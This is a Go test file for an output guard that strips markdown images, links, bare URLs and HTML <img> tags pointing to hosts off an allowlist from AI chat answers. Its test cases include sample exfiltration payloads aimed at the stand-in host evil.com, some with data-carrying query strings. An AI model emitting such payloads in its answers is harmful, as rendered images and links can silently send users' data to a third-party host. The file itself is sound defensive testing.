// Copyright 2026 The Guard Spec Authors
// SPDX-License-Identifier: Apache-2.0

package outputguard

import (
	"strings"
	"testing"

	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/ast"
	"github.com/yuin/goldmark/extension"
	"github.com/yuin/goldmark/text"
)

// commonMark parses markdown as GitHub does (CommonMark with the GFM
// extensions, among them bare URLs as links), the way most chat interfaces
// render an answer.
var commonMark = goldmark.New(goldmark.WithExtensions(extension.GFM))

// renderedLeaks parses out as a renderer would and returns the links, images,
// autolinks and HTML images in it that the guard removes when they appear in
// an answer as such and that can reach a third-party host: images and links
// to an absolute URL off the allowlist (reference definitions show up as the
// links that use them), URLs of an image with a query, and <img> tags that
// load from such a host.
func renderedLeaks(g *Guard, out string) []string {
	src := []byte(out)
	doc := commonMark.Parser().Parse(text.NewReader(src))
	var leaks []string
	html := func(raw string) {
		for _, tag := range htmlImgRe.FindAllString(raw, -1) {
			if !g.imgAllowed(tag) {
				leaks = append(leaks, "html "+tag)
			}
		}
	}
	_ = ast.Walk(doc, func(n ast.Node, entering bool) (ast.WalkStatus, error) {
		if !entering {
			return ast.WalkContinue, nil
		}
		switch n := n.(type) {
		case *ast.Link:
			if dest := string(n.Destination); webURL(dest) && !g.allowed(dest) {
				leaks = append(leaks, "link "+dest)
			}
		case *ast.Image:
			if dest := string(n.Destination); webURL(dest) && !g.allowed(dest) {
				leaks = append(leaks, "image "+dest)
			}
		case *ast.AutoLink:
			if u := string(n.URL(src)); n.AutoLinkType == ast.AutoLinkURL && isImageWithQuery(u) && !g.allowed(u) {
				leaks = append(leaks, "url "+u)
			}
		case *ast.RawHTML:
			var b strings.Builder
			for i := 0; i < n.Segments.Len(); i++ {
				seg := n.Segments.At(i)
				b.Write(seg.Value(src))
			}
			html(b.String())
		case *ast.HTMLBlock:
			var b strings.Builder
			for i := 0; i < n.Lines().Len(); i++ {
				seg := n.Lines().At(i)
				b.Write(seg.Value(src))
			}
			if n.HasClosure() {
				b.Write(n.ClosureLine.Value(src))
			}
			html(b.String())
		}
		return ast.WalkContinue, nil
	})
	return leaks
}

// webURL reports whether a browser reads dest as a web address of its own
// (http, https, or "//host"), rather than as a path relative to the page or
// a scheme it does not fetch: only such a URL can reach a third-party host.
// The guard removes those other links too, but a renderer may read a
// destination the guard does not see as one, such as "()(x" with
// parentheses that do not pair up, or "REDACTED:email((https://...", which
// stay on the page or go nowhere.
func webURL(dest string) bool {
	dest = strings.ToLower(strings.TrimSpace(dest))
	if len(dest) >= 2 && (dest[0] == '/' || dest[0] == '\\') && (dest[1] == '/' || dest[1] == '\\') {
		return true
	}
	return strings.HasPrefix(dest, "http:") || strings.HasPrefix(dest, "https:")
}

// guardLeaks returns the images, links, reference definitions, <img> tags and
// URLs that the guard itself would still remove from out: none may be left
// in what it produced.
func guardLeaks(s *Scanner, out string) []string {
	accepted, _ := s.spans(out, 0)
	var leaks []string
	for _, a := range accepted {
		switch a.kind {
		case KindImage, KindLink, KindURL:
			leaks = append(leaks, a.kind+" "+out[a.start:a.end])
		}
	}
	return leaks
}

// checkNoLeaks fails when what the guard made of in still holds an image,
// link or URL that the guard removes, as a renderer or the guard itself
// reads it.
func checkNoLeaks(t *testing.T, s *Scanner, in, out string) {
	t.Helper()
	if leaks := guardLeaks(s, out); len(leaks) > 0 {
		t.Fatalf("the guard would still remove %q from %q (from %q)", leaks, out, in)
	}
	if leaks := renderedLeaks(s.g, out); len(leaks) > 0 {
		t.Fatalf("rendered, %q holds %q (from %q)", out, leaks, in)
	}
}

// The checker itself: it finds what the guard removes in raw answers.
func TestRenderedLeaksChecker(t *testing.T) {
	g := propScanner(CanaryRedact).g
	for _, in := range []string{
		"![x](https://evil.com/a.png)", "[x](https://evil.com/?q=1)", "[x][r]\n\n[r]: https://evil.com/\n",
		"see https://evil.com/a.png?d=1 now", "<https://evil.com/a.png?d=1>", "www.evil.com/a.jpg?x=1",
		`<img src="https://evil.com/p.gif">`, "<p>\n<img src=https://evil.com/p.gif>\n</p>\n",
		"[REDACTED:image](https://evil.com/?q=S)", "[x](//evil.com/a)", "[x](HTTPS://evil.com)",
	} {
		if len(renderedLeaks(g, in)) == 0 {
			t.Errorf("no leak found in %q", in)
		}
	}
	for _, in := range []string{
		"[ok](https://docs.example.com/page)", "![ok](https://docs.example.com/a.png?x=1)",
		"https://evil.com/page and https://evil.com/a.png", "[REDACTED:image] [REDACTED:url]",
		"![x]\n(https://evil.com/a.png)", "[x] (https://evil.com/)", "[x](()(https://evil.com/?q=1)",
		"[x](page.html)", "[x](/a:b)",
	} {
		if leaks := renderedLeaks(g, in); len(leaks) > 0 {
			t.Errorf("%q: found %q", in, leaks)
		}
	}
}
